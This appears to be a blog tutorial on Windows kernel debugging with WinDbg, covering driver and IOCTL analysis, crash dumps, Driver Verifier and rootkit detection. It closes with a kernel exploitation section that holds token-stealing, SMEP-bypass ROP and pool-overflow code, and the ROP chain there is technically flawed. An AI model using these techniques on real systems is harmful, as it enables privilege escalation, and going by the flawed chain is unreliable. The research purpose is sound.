---
title: "Windows Kernel Debugging: From Ring 0 Analysis to Driver Exploitation"
description: "Comprehensive guide to Windows kernel debugging using WinDbg, analyzing kernel drivers, understanding IRQL levels, debugging blue screens, and developing kernel exploits for privilege escalation vulnerabilities."
pubDate: 2024-07-18
author: "Mamoun Tarsha-Kurdi"
tags: ["reverse-engineering", "windows", "kernel", "debugging"]
draft: false
---

## Introduction

Windows kernel debugging provides unprecedented visibility into system internals, enabling analysis of drivers, rootkits, blue screens, and kernel vulnerabilities. Mastering kernel debugging is essential for advanced vulnerability research and exploit development.

## Kernel Debugging Setup

### Debug Environment Configuration

**Target Machine** (debuggee):

```cmd
REM Enable kernel debugging
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000 key:1.2.3.4

REM Disable driver signature enforcement (testing only)
bcdedit /set testsigning on
bcdedit /set nointegritychecks on

REM Restart to apply
shutdown /r /t 0
```

**Host Machine** (debugger):

```cmd
REM Install Windows SDK (includes WinDbg)
REM Download from: https://developer.microsoft.com/windows/downloads/windows-sdk/

REM Launch WinDbg Preview
windbgx.exe

REM Connect to target
File > Attach to kernel > Net
Port: 50000
Key: 1.2.3.4

REM Wait for target to boot...
Waiting to reconnect...
Connected to Windows 10 22H2 x64
```

### Virtual Machine Debugging

```powershell
# VMware pipe debugging (faster than network)
# Add to .vmx file:
debugStub.listen.guest64 = "TRUE"
debugStub.listen.guest64.remote = "TRUE"

# WinDbg connection
windbg -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect
```

## Kernel Architecture Fundamentals

### Privilege Levels (Rings)

```
Ring 0 (Kernel Mode):
- Full hardware access
- Execute privileged instructions
- Direct memory access
- IRQL: PASSIVE_LEVEL to HIGH_LEVEL

Ring 3 (User Mode):
- Limited memory access
- System calls via SYSCALL/SYSENTER
- Exceptions cause kernel transition
```

### IRQL (Interrupt Request Level)

```
HIGH_LEVEL (31)     - Machine checks, catastrophic failures
POWER_LEVEL (30)    - Power management
IPI_LEVEL (29)      - Inter-processor interrupts
CLOCK_LEVEL (28)    - System clock
DIRQL (3-26)        - Device IRQLs
DISPATCH_LEVEL (2)  - DPC/APC scheduling
APC_LEVEL (1)       - Asynchronous procedure calls
PASSIVE_LEVEL (0)   - Normal thread execution
```

**Critical Rule**: Cannot page fault at DISPATCH_LEVEL or higher

```c
// INCORRECT: Paging at elevated IRQL
VOID MyDpcRoutine(PKDPC Dpc, PVOID Context, PVOID SysArg1, PVOID SysArg2) {
    KIRQL old_irql = KeGetCurrentIrql();  // DISPATCH_LEVEL

    PVOID buffer = ExAllocatePoolWithTag(PagedPool, 0x1000, 'Tag1');
    // ^^^^^ BUG: Paged pool at DISPATCH_LEVEL
    // Will cause IRQL_NOT_LESS_OR_EQUAL BSOD
}

// CORRECT: Non-paged memory at elevated IRQL
VOID MyDpcRoutine(PKDPC Dpc, PVOID Context, PVOID SysArg1, PVOID SysArg2) {
    PVOID buffer = ExAllocatePoolWithTag(NonPagedPool, 0x1000, 'Tag1');
    // Correct: NonPagedPool is always resident
}
```

## WinDbg Kernel Commands

### Essential Commands

```
# System information
kd> vertarget          # OS version, uptime
kd> !cpuinfo           # CPU details
kd> !pci               # PCI devices

# Modules
kd> lm                 # List loaded modules
kd> lmvm ntoskrnl      # Detailed module info
kd> !dh ntoskrnl       # PE headers

# Processes and threads
kd> !process 0 0       # List all processes
kd> !process 0 7 lsass.exe  # Detailed lsass.exe info
kd> !thread            # Current thread
kd> !pcr               # Processor Control Region

# Memory
kd> !pte <address>     # Page table entry
kd> !pool <address>    # Pool allocation info
kd> !poolused          # Pool usage statistics
kd> !vm                # Virtual memory stats

# Drivers
kd> !drvobj <name>     # Driver object details
kd> !devnode 0 1       # Device tree
kd> !irp <address>     # IRP (I/O Request Packet) info

# Debugging
kd> bp nt!NtCreateFile # Set breakpoint
kd> ba r4 <address>    # Hardware breakpoint (read 4 bytes)
kd> g                  # Go (continue)
kd> k                  # Stack trace
```

### Advanced Analysis

```
# Find driver handling address
kd> !address <address>

# Analyze crash dump
kd> !analyze -v

# Examine kernel structures
kd> dt nt!_EPROCESS
kd> dt nt!_KTHREAD
kd> dt nt!_DRIVER_OBJECT

# Pool tracking
kd> !pooltrack Tag1
kd> !poolfind Tag1

# Object tracking
kd> !object \Device
kd> !object \Driver
```

## Analyzing Kernel Drivers

### Driver Entry Point Analysis

```
kd> lmvm mydriver
Browse full module list
start             end                 module name
fffff800`12340000 fffff800`12350000   mydriver   (deferred)

kd> ln fffff800`12340000
(fffff800`12340000)   mydriver!DriverEntry

kd> uf fffff800`12340000
mydriver!DriverEntry:
fffff800`12340000 mov qword ptr [rsp+8], rbx
fffff800`12340005 push rdi
fffff800`12340006 sub rsp, 20h
fffff800`1234000a mov rdi, rdx          ; RegistryPath
fffff800`1234000d mov rbx, rcx          ; DriverObject
fffff800`12340010 call mydriver!InitializeGlobals
fffff800`12340015 test eax, eax
fffff800`12340017 js mydriver!DriverEntry+0x50

# Set dispatch routines
kd> dt nt!_DRIVER_OBJECT poi(rbx)
   +0x000 Type             : 0n4
   +0x002 Size             : 0n168
   +0x008 DeviceObject     : (null)
   +0x010 Flags            : 0x12
   +0x018 DriverStart      : 0xfffff800`12340000
   +0x020 DriverSize       : 0x10000
   +0x028 DriverSection    : 0xffffcb00`12345678
   +0x030 DriverExtension  : 0xffffcb00`12346000
   +0x038 DriverName       : _UNICODE_STRING "\Driver\MyDriver"
   +0x048 HardwareDatabase : 0xfffff800`00000000
   +0x050 FastIoDispatch   : (null)
   +0x058 DriverInit       : 0xfffff800`12340000  mydriver!DriverEntry
   +0x060 DriverStartIo    : (null)
   +0x068 DriverUnload     : 0xfffff800`12345000  mydriver!DriverUnload
   +0x070 MajorFunction    : [28] 0xfffff800`12346000  mydriver!DispatchCreate

# Examine dispatch handlers
kd> dps rbx+0x70 L28  # MajorFunction table
fffff800`12340070  fffff800`12346000 mydriver!DispatchCreate        # IRP_MJ_CREATE
fffff800`12340078  fffff800`12346100 mydriver!DispatchClose         # IRP_MJ_CLOSE
fffff800`12340080  fffff800`12346200 mydriver!DispatchRead          # IRP_MJ_READ
fffff800`12340088  fffff800`12346300 mydriver!DispatchWrite         # IRP_MJ_WRITE
fffff800`12340090  fffff800`12346400 mydriver!DispatchDeviceControl # IRP_MJ_DEVICE_CONTROL
```

### IOCTL Handling Analysis

```c
// Reverse-engineered IOCTL handler
NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG ioctl_code = stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID input_buffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG input_length = stack->Parameters.DeviceIoControl.InputBufferLength;
    PVOID output_buffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG output_length = stack->Parameters.DeviceIoControl.OutputBufferLength;

    switch (ioctl_code) {
        case 0x222004:  // Vulnerable IOCTL
            // VULNERABILITY: No length validation
            memcpy(output_buffer, g_KernelData, input_length);
            // ^^^^^ Arbitrary kernel memory disclosure
            break;

        case 0x222008:
            // VULNERABILITY: Arbitrary write
            *(PULONG64)input_buffer = *(PULONG64)(input_buffer + 8);
            // ^^^^^ Write-what-where primitive
            break;
    }

    Irp->IoStatus.Information = output_length;
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
```

**Finding IOCTLs in WinDbg**:

```
kd> bp mydriver!DispatchDeviceControl
Breakpoint 0 hit

kd> dt nt!_IO_STACK_LOCATION poi(rdx+0xb8)
   +0x000 MajorFunction    : 0xe ''
   +0x001 MinorFunction    : 0 ''
   +0x002 Flags            : 0 ''
   +0x003 Control          : 0 ''
   +0x008 Parameters       : <anonymous-tag>
      +0x000 DeviceIoControl : <anonymous-tag>
         +0x000 OutputBufferLength : 0x1000
         +0x008 InputBufferLength : 0x20
         +0x010 IoControlCode  : 0x222004
         +0x018 Type3InputBuffer : (null)

kd> dc rdx+0x18  # SystemBuffer
ffffcb00`12340018  41414141 42424242 43434343 44444444
ffffcb00`12340028  00000000 00000000 00000000 00000000
```

## Blue Screen Analysis

### Crash Dump Analysis

```
# Open crash dump
windbg -z C:\Windows\MEMORY.DMP

kd> !analyze -v

DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.  This is usually caused by drivers
using improper addresses.

Arguments:
Arg1: fffff800deadbeef, memory referenced
Arg2: 0000000000000002, IRQL
Arg3: 0000000000000000, value 0 = read operation, 1 = write operation
Arg4: fffff80012345678, address which referenced memory

STACK_TEXT:
nt!KeBugCheckEx
nt!KiBugCheckDispatch+0x69
nt!KiPageFault+0x456
mydriver!VulnerableFunction+0x12  ← CRASH LOCATION
mydriver!DispatchDeviceControl+0x34
nt!IofCallDriver+0x55
nt!IopSynchronousServiceTail+0x1ad
nt!NtDeviceIoControlFile+0x5a4
nt!KiSystemServiceCopyEnd+0x25

kd> ub fffff80012345678  # Disassemble before crash
mydriver!VulnerableFunction+0x8:
fffff800`12345670 mov rax, qword ptr [rcx+10h]
fffff800`12345674 test rax, rax
fffff800`12345677 je mydriver!VulnerableFunction+0x20
fffff800`12345679 mov rbx, qword ptr [rax]  ← CRASH: NULL pointer dereference
```

### Common Bug Check Codes

```c
// 0x0000000A: IRQL_NOT_LESS_OR_EQUAL
// Cause: Accessing paged memory at DISPATCH_LEVEL or higher

// 0x000000D1: DRIVER_IRQL_NOT_LESS_OR_EQUAL
// Cause: Driver accessed invalid memory at elevated IRQL

// 0x000000C4: DRIVER_VERIFIER_DETECTED_VIOLATION
// Cause: Driver Verifier caught a violation

// 0x0000003B: SYSTEM_SERVICE_EXCEPTION
// Cause: Exception in kernel-mode system service

// 0x00000050: PAGE_FAULT_IN_NONPAGED_AREA
// Cause: Invalid memory reference in non-paged code
```

## Kernel Exploitation Techniques

### Arbitrary Write Primitive

```c
// User-mode exploit code
#include <windows.h>
#include <stdio.h>

typedef struct _WRITE_PAYLOAD {
    PVOID64 Where;    // Address to write
    ULONG64 What;     // Value to write
} WRITE_PAYLOAD, *PWRITE_PAYLOAD;

BOOL ArbitraryWrite(HANDLE hDevice, PVOID64 where, ULONG64 what) {
    WRITE_PAYLOAD payload = {where, what};
    DWORD bytesReturned;

    return DeviceIoControl(
        hDevice,
        0x222008,              // Vulnerable IOCTL
        &payload,
        sizeof(payload),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}

// Token stealing technique
void StealSystemToken() {
    HANDLE hDevice = CreateFileA("\\\\.\\MyDriver",
                                 GENERIC_READ | GENERIC_WRITE,
                                 0, NULL, OPEN_EXISTING, 0, NULL);

    // Get current process EPROCESS
    ULONG64 current_eprocess = GetCurrentEPROCESS();

    // Get SYSTEM process EPROCESS (PID 4)
    ULONG64 system_eprocess = GetSystemEPROCESS();

    // Windows 10 token offset
    ULONG64 token_offset = 0x360;

    // Read SYSTEM token
    ULONG64 system_token = ReadQWORD(system_eprocess + token_offset);

    // Write SYSTEM token to current process
    ArbitraryWrite(hDevice, current_eprocess + token_offset, system_token);

    // Now running as SYSTEM
    system("cmd.exe");
}
```

### SMEP (Supervisor Mode Execution Prevention) Bypass

SMEP prevents kernel from executing user-mode code (CR4.SMEP bit).

**Bypass**: ROP to disable SMEP

```c
// Find kernel gadgets
kd> s -q nt L?7fffffffffffffff 48 89 e0 c3  # mov rax, rsp; ret
fffff800`12345000  48 89 e0 c3 ...

kd> s -q nt L?7fffffffffffffff 0f 22 e0 c3  # mov cr4, rax; ret
fffff800`12346000  0f 22 e0 c3 ...

// ROP chain
ULONG64 rop_chain[] = {
    0xfffff80012345000,  // mov rax, rsp; ret
    0x0000000000000000,  // (padding)
    0xfffff80012346000,  // mov cr4, rax; ret
    // Now SMEP disabled, can execute user-mode shellcode
    (ULONG64)&shellcode
};

// Trigger ROP via stack overflow
VulnerableIOCTL(hDevice, rop_chain, sizeof(rop_chain));
```

### Kernel Pool Corruption

```c
// Pool overflow vulnerability
PVOID VulnerableAllocate(SIZE_T size) {
    PVOID buffer = ExAllocatePoolWithTag(NonPagedPool, 0x100, 'Vuln');

    // VULNERABILITY: Copies user data without bounds check
    RtlCopyMemory(buffer, UserData, size);  // size not validated!

    return buffer;
}

// Exploitation: Corrupt adjacent pool allocation
typedef struct _POOL_OVERFLOW_EXPLOIT {
    CHAR padding[0x100];           // Fill victim allocation

    // Overwrite adjacent IO_COMPLETION object
    ULONG Type;                    // 0x00000002 (IO_COMPLETION_TYPE)
    ULONG CompletionKey;           // Controlled
    PVOID CompletionContext;       // Controlled → RIP
} POOL_OVERFLOW_EXPLOIT;

POOL_OVERFLOW_EXPLOIT exploit = {0};
exploit.CompletionKey = 0x41424344;
exploit.CompletionContext = (PVOID)shellcode_address;

// Spray pool to position objects adjacently
for (int i = 0; i < 10000; i++) {
    CreateIoCompletion(&handles[i]);
}

// Trigger overflow
VulnerableIOCTL(hDevice, &exploit, sizeof(exploit));

// Trigger corrupted IO_COMPLETION
SetEvent(handles[spray_index]);  // Calls shellcode_address
```

## Driver Verifier

### Enabling Verifier

```cmd
REM Verify all drivers (aggressive)
verifier /standard /all

REM Verify specific driver
verifier /standard /driver mydriver.sys

REM Query current settings
verifier /query

REM Disable verifier
verifier /reset
```

### Verifier-Detected Issues

```
kd> !analyze -v

DRIVER_VERIFIER_DETECTED_VIOLATION (c4)
Arg1: 00000020  # Subclass
Arg2: fffff800`12345000  # Memory block
Arg3: 0000000000000100  # Requested size
Arg4: 0000000000000000

# Common violations:
0x20: Trying to free already-freed memory (double-free)
0x62: Calling ExAllocatePool at DISPATCH_LEVEL with PagedPool
0xC1: Special pool corruption detected
```

## Kernel Rootkit Detection

### SSDT (System Service Descriptor Table) Hooking

```
kd> dps nt!KiServiceTable L191
fffff800`12340000  fffff800`12340100 nt!NtClose
fffff800`12340008  fffff800`12340200 nt!NtCreateFile
fffff800`12340010  fffff800`12340300 nt!NtDeviceIoControlFile
fffff800`12340018  fffff800`99999999 rootkit!HookedNtReadFile  ← HOOKED
fffff800`12340020  fffff800`12340500 nt!NtWriteFile

# Detect hook
kd> !chkimg nt  # Check ntoskrnl integrity
Comparison image path: C:\Symbols\ntkrnlmp.exe
fffff800`12340018: rootkit!HookedNtReadFile ← Mismatch
```

### DKOM (Direct Kernel Object Manipulation)

```
# Hidden process detection
kd> !process 0 0  # List all processes via PsActiveProcessHead

PROCESS ffffcb00`12340000
    SessionId: 1  Cid: 1234    Peb: 00000000  ParentCid: 5678
    DirBase: 1a2b3c4d  ObjectTable: ffffcb00`12350000
    Image: malware.exe

# But not in EPROCESS linked list (unlinked by rootkit)
kd> !list "-e -x \"dt nt!_EPROCESS @$extret\" poi(nt!PsActiveProcessHead)"
# malware.exe missing from list

# Detect via handle table scan
kd> !handle 0 0 -1 -a Process
# malware.exe EPROCESS found at ffffcb00`12340000
```

## Time-Travel Debugging

### Recording Kernel Trace

```powershell
# Boot target with TTD
bcdedit /set testsigning on
bcdedit /debug on
bcdedit /bootdebug on

# Start TTD recorder (requires Windows 10 1809+)
ttd.exe /kernel /out C:\ttd_trace

# Trigger vulnerability
# ... exploit code runs ...

# Trace saved to C:\ttd_trace\kernel01.run
```

### Analyzing Kernel TTD Trace

```
windbg -k ttd:trace="C:\ttd_trace\kernel01.run"

kd> !tt 100:0  # Jump to position 100:0
kd> !position  # Show current trace position

# Set breakpoint in past
kd> ba r8 mydriver!g_VulnerablePointer
kd> g-  # Go backwards until breakpoint

# Memory access timeline
kd> !ttd.memory <address>
# Shows all reads/writes to address across entire trace
```

## Conclusion

Windows kernel debugging is a critical skill for advanced security research. Combining WinDbg mastery, deep knowledge of kernel internals, and systematic analysis techniques enables discovering and exploiting kernel vulnerabilities, analyzing rootkits, and performing deep system forensics.

Modern kernel mitigations (SMEP, KASLR, CFG, VBS) raise the bar for exploitation, but understanding fundamental debugging techniques remains essential for both offensive and defensive security.

## References

1. Microsoft (2023). "Kernel-Mode Driver Architecture"
2. Microsoft (2023). "Debugging Tools for Windows"
3. Ionescu, A. (2019). "Windows Internals, Part 1"
4. Hoglund, G., Butler, J. (2005). "Rootkits: Subverting the Windows Kernel"
